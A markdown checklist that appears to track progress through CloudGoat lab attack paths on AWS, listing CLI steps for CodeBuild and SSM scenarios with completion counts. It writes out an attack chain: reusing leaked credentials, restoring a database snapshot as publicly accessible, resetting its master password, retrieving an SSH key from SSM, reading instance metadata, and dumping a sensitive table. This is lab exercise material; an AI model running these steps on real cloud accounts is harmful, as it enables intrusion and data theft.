# Relative path
## CodeBuild (6a)
- [ ] aws configure --profile Solo
- [ ] aws codebuild batch-get-projects --names <project\> --profile Solo
- [x] aws configure --profile Calrissian
- [ ] aws rds create-db-snapshot --db-instance-identifier <instanceID\> --db-snapshot-identifier cloudgoat --profile Calrissian
- [ ] aws rds restore-db-instance-from-db-snapshot --db-instance-identifier <DbInstanceID\> --db-snapshot-identifier <snapshotId\> --db-subnet-group-name <db subnet group\> --publicly-accessible --vpc-security-group-ids <ec2-security group\> --profile Calrissian
- [x] aws rds modify-db-instance --db-instance-identifier <DbName\> --master-user-password cloudgoat --profile Calrissian
- [x] psql postgresql://cgadmin@pwnedfinal.crkxmju52zsx.us-east-1.rds.amazonaws.com:5432/postgres
- [x] select * from sensitive_information

Steps: 8
Completed: 4

## SSM A (6b)

- [ ] aws ssm get-parameter --name <private key name\> --profile solo
- [x] ssh -i ec2_ssh_key ubuntu@<instance ip\>
- [x] (Assume EC2 role)
- [ ] aws lambda list-functions --region us-east-1
- [x] psql -h <rds db host/ip\> -U cgadmin -d cloudgoat
- [x] select * from sensitive_information

Steps: 6
Completed: 4

## SSM B (6c)

- [ ] aws ssm get-parameter --name <private key name\> --profile solo
- [x] ssh -i ec2_ssh_key ubuntu@<instance ip\>
- [ ] curl http://169.254.169.254/latest/user-data
- [x] psql -h <rds db host/ip\> -U cgadmin -d cloudgoat
- [x] select * from sensitive_information

Steps: 5
Completed: 3

# Absolute path
## CodeBuild (6a)

- [ ] aws configure --profile Solo
- [ ] aws codebuild list-projects --profile Solo
- [ ] aws codebuild batch-get-projects --names <project\> --profile Solo
- [x] aws configure --profile Calrissian // Assume Calrissian
- [ ] aws rds describe-db-instances --profile Calrissian
- [ ] aws rds create-db-snapshot --db-instance-identifier <instanceID\> --db-snapshot-identifier cloudgoat --profile Calrissian
- [ ] aws rds describe-db-subnet-groups --profile Calrissian
- [ ] aws ec2 describe-security-groups --profile Calrissian
- [ ] aws rds restore-db-instance-from-db-snapshot --db-instance-identifier <DbInstanceID\> --db-snapshot-identifier <snapshotId\> --db-subnet-group-name <db subnet group\> --publicly-accessible --vpc-security-group-ids <ec2-security group\> --profile Calrissian
- [x] aws rds modify-db-instance --db-instance-identifier <DbName\> --master-user-password cloudgoat --profile Calrissian
- [x] psql postgresql://cgadmin@pwnedfinal.crkxmju52zsx.us-east-1.rds.amazonaws.com:5432/postgres
- [ ] \l
- [ ] \c securedb
- [x] select * from sensitive_information

Steps: 14
Completed: 4

## SSM A (6b)

- [ ] aws ssm describe-parameters --profile solo
- [ ] aws ssm get-parameter --name <private key name> --profile solo
- [ ] echo -e "<private key\>" > ec2_ssh_key
- [ ] chmod 400 ec2_ssh_key
- [ ] aws ssm get-parameter --name <public key name\> --profile solo
- [ ] echo -e "<public key\>" > ec2_ssh_key.pub
- [ ] aws ec2 describe-instances --profile solo
- [x] ssh -i ec2_ssh_key ubuntu@<instance ip\>
- [x] (Assume EC2 role)
- [ ] sudo apt update && sudo apt install awscli -y
- [ ] aws lambda list-functions --region us-east-1
- [ ] aws rds describe-db-instances --profile solo
- [x] psql -h <rds db host/ip\> -U cgadmin -d cloudgoat // Inferred
- [ ] \d // Inferred
- [x] select * from sensitive_information; // Inferred

Steps: 15
Completed: 4

## SSM B (6c)

- [ ] aws ssm describe-parameters --profile solo
- [ ] aws ssm get-parameter --name <private key name\> --profile solo
- [ ] echo -e "<private key\>" > ec2_ssh_key
- [ ] chmod 400 ec2_ssh_key
- [ ] aws ssm get-parameter --name <public key name\> --profile solo
- [ ] echo -e "<public key\>" > ec2_ssh_key.pub
- [ ] aws ec2 describe-instances --profile solo
- [x] ssh -i ec2_ssh_key ubuntu@<instance ip\>
- [ ] curl http://169.254.169.254/latest/user-data
- [x] psql -h <rds db host/ip\> -U cgadmin -d cloudgoat
- [ ] \d
- [x] select * from sensitive_information;

Steps: 12
Completed: 3
